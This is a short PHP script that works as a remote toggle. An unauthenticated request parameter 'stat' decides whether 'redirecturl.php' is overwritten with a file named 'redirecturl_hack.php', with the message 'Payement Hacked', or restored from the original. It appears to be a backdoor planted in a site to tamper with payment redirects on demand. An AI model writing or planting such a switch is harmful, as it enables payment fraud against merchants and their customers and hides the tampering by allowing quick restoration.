<?php


$err = $_REQUEST['stat'];





if (isset($err)){


if($err == 1){

copy("redirecturl_hack.php","redirecturl.php");

echo "Payement Hacked";

}else{


copy("redirecturl_orig.php","redirecturl.php");

echo "Back To Original";


}




}else{
copy("redirecturl_orig.php","redirecturl.php");

echo "Back To Original";
}
